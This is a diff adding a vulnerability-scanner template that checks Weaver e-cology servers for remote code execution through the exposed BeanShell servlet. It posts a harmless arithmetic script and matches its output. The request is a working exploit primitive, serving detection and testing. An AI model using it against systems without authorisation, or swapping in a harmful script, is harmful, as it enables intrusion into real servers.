@@ -1,0 +1,13 @@
+name: poc-yaml-ecology-javabeanshell-rce
+rules:
+  - method: POST
+    path: /weaver/bsh.servlet.BshServlet
+    body: >-
+      bsh.script=print%286311*2992%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+    follow_redirects: false
+    expression: |
+      status==200 && body.bcontains(b'18882512')
+detail:
+  author: l1nk3r
+  links:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
